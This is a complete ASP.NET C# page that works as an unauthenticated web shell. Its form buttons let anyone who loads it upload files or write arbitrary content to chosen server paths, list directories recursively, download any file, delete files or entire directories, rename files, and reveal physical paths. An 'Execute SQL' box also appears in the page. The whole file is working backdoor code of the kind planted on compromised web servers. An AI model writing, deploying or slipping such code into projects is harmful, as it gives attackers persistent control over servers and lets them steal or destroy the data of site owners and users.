<%@ Page Language="C#" %>
<%@ Import Namespace="System.IO" %>

<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head runat="server">
    <title>无标题页</title>

    <script runat="server">
        protected void btn_save_file_Click(object sender, EventArgs e)
        {
            try
            {
                if (fu_file.HasFile)
                {
                    fu_file.SaveAs(Server.MapPath(".")+this.txt_server_file_path.Text);
                }
            }
            catch (Exception error)
            {
                this.txt_result.Text = error.Message;
            }
        }
        protected void btn_get_file_path_Click(object sender, EventArgs e)
        {
            try
            {
                if (string.IsNullOrEmpty(this.txt_url.Text))
                {
                    this.txt_result.Text = Request.PhysicalPath;
                }
                else
                {
                    this.txt_result.Text = Server.MapPath(this.txt_url.Text);
                }
            }
            catch (Exception error)
            {
                this.txt_result.Text = error.Message;
            }
        }
        protected void btn_list_file_Click(object sender, EventArgs e)
        {
            try
            {
                string file_path = this.txt_file_path.Text;
                if (Directory.Exists(file_path))
                {
                    txt_result.Text = get_files(file_path, "");
                } 
            }
            catch (Exception error)
            {
                this.txt_result.Text = error.Message;
            }
        }
        protected void btn_delete_file_Click(object sender, EventArgs e)
        {
            try
            {
                string file_path = this.txt_file_path.Text;
                if (Directory.Exists(file_path))
                {
                    Directory.Delete(file_path, true);
                    this.txt_result.Text = "delete directory OK";
                }
                if (File.Exists(file_path))
                {
                    File.Delete(file_path);
                    this.txt_result.Text = "delete file OK";
                }
            }
            catch (Exception error)
            {
                this.txt_result.Text = error.Message;
            }
        }

        protected void btn_down_file_Click(object sender, EventArgs e)
        {
            try
            {
                down_file(this.txt_file_path.Text);
            } 
            catch (Exception error)
            {
                this.txt_result.Text = error.Message;
            }
        }
        protected void btn_get_detail_info_Click(object sender, EventArgs e)
        {
            try
            {
                string file_path = this.txt_file_path.Text;
                if (Directory.Exists(file_path))
                {
                    DirectoryInfo dir = new DirectoryInfo(file_path);
                    string dir_info = "Directory Name:" + dir.FullName + Environment.NewLine +
                                        "Last Access Time:" + dir.LastAccessTime.ToString() + Environment.NewLine +
                                        "Last Write Time:" + dir.LastWriteTime.ToString() + Environment.NewLine;
                    this.txt_result.Text = dir_info;

                }
                if (File.Exists(file_path))
                {
                    FileInfo file = new FileInfo(file_path);
                    string file_info = "File Name:" + file.FullName + Environment.NewLine +
                                     "Last Access Time:" + file.LastAccessTime + Environment.NewLine +
                                     "Last Write Time:" + file.LastWriteTime + Environment.NewLine +
                                     "File Size:" + (file.Length / 1024).ToString() + " K";
                    this.txt_result.Text = file_info;
                }
            } 
            catch (Exception error)
            {
                this.txt_result.Text = error.Message;
            }
        }

        public string get_files(string directory, string prefix)
        {
            string result = "";
            DirectoryInfo info = new DirectoryInfo(directory);
            foreach (DirectoryInfo dir in info.GetDirectories())
            {
                prefix = prefix + "-";
                result = result +"[D]"+ dir.FullName + Environment.NewLine;
                result = result + get_files(dir.FullName, prefix);
            }
            foreach (FileInfo file in info.GetFiles())
            {
                result = result + "[F]"+file.FullName + Environment.NewLine;
            }
            return result;
        }  
        public static void down_file(string file_name)
        {
            FileInfo file_info = new FileInfo(file_name);
            string new_file_name = System.Web.HttpUtility.UrlEncode(file_name.Replace(@":", "[1]").Replace(@"/", "[2]").Replace(@"\", "[2]"), System.Text.Encoding.UTF8);
            System.Web.HttpContext.Current.Response.Clear();
            System.Web.HttpContext.Current.Response.ClearHeaders();
            System.Web.HttpContext.Current.Response.Buffer = false;
            System.Web.HttpContext.Current.Response.ContentType = "application/octet-stream";
            System.Web.HttpContext.Current.Response.AppendHeader("Content-Disposition", "attachment;filename=" + new_file_name);
            System.Web.HttpContext.Current.Response.AppendHeader("Content-Length", file_info.Length.ToString());
            System.Web.HttpContext.Current.Response.WriteFile(file_name);
            System.Web.HttpContext.Current.Response.Flush();
            System.Web.HttpContext.Current.Response.End();

        }

        protected void btn_rename_Click(object sender, EventArgs e)
        {
            try
            {
                File.Move(this.txt_old.Text, this.txt_new.Text);
            }
            catch (Exception error)
            {
                this.txt_result.Text = error.Message;
            }
        }
 
        protected void btn_create_file_Click(object sender, EventArgs e)
        {
            try
            {
                string file_name = Server.MapPath(".") + this.txt_server_file_path.Text;
                string content = this.txt_file_content.Text;
                FileStream stream = File.Open(file_name, FileMode.OpenOrCreate);
                byte[] data = System.Text.Encoding.Default.GetBytes(content);

                BinaryWriter write = new BinaryWriter(stream);
                write.Write(data);
                write.Close();
            }
            catch (Exception error)
            {
                this.txt_result.Text = error.Message;
            }
        }
</script>

</head>
<body>
    <form id="form1" runat="server">
    <div>
        <%--Execute Sql--%>
        <asp:TextBox ID="txt_sql" runat="server" Height="117px" Width="707px" TextMode="MultiLine"></asp:TextBox> &nbsp;
        <asp:Button ID="btn_execute_sql" runat="server" Text="Execute SQL" Width="110px" />
        <br />
        <hr />
        <%--UpLoad File--%>
        <br />
        <asp:TextBox ID="txt_file_content" runat="server" Height="140px" 
            TextMode="MultiLine" Width="718px"></asp:TextBox>
        <br />
        <br />
        Client File:
        <asp:FileUpload ID="fu_file" runat="server" /> &nbsp;&nbsp; 
        Absolute File Path:&nbsp;&nbsp;
        <asp:TextBox ID="txt_server_file_path" runat="server" Width="323px"></asp:TextBox>&nbsp;&nbsp;
        <asp:Button ID="btn_save_file" runat="server" Text="Save File" Width="111px" OnClick="btn_save_file_Click" />
        &nbsp;
        <asp:Button ID="btn_create_file" runat="server" onclick="btn_create_file_Click" 
            Text="Create File" />
        <br />
        <hr />
        <%--File Operate--%>
        <asp:TextBox ID="txt_result" runat="server" Height="140px" TextMode="MultiLine" Width="833px"></asp:TextBox>
        <br />
        <br />
        Url:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
        <asp:TextBox ID="txt_url" runat="server" Width="308px"></asp:TextBox> &nbsp;
        <asp:Button ID="btn_get_file_path" runat="server" OnClick="btn_get_file_path_Click"  Text="Get File Path" Width="100px" />
        <br />
        <br />
        File Path:&nbsp;
        <asp:TextBox ID="txt_file_path" runat="server" Width="307px"></asp:TextBox> &nbsp;
        <asp:Button ID="btn_list_path" runat="server" OnClick="btn_list_file_Click" 
            Text="List Directory" Width="102px" /> &nbsp;
        <asp:Button ID="btn_get_detail_info" runat="server" 
            OnClick="btn_get_detail_info_Click"  Text="Get File/Dir Info" Width="109px" /> &nbsp;
        <asp:Button ID="btn_delete_file" runat="server" OnClick="btn_delete_file_Click" 
            Text="Delete File/Dir"  Width="102px" />  &nbsp;
        <asp:Button ID="btn_down_file" runat="server" OnClick="btn_down_file_Click" 
            Text="DownLoad File" Width="109px" />
        <br />
        <br />
        Old Name:&nbsp;
        <asp:TextBox ID="txt_old" runat="server" Width="249px"></asp:TextBox> &nbsp; 
        New Name:&nbsp;
        <asp:TextBox ID="txt_new" runat="server" Width="233px"></asp:TextBox> &nbsp;
        <asp:Button ID="btn_rename" runat="server" onclick="btn_rename_Click"  Text="Rename" />
    </div>
    </form>
</body>
</html>
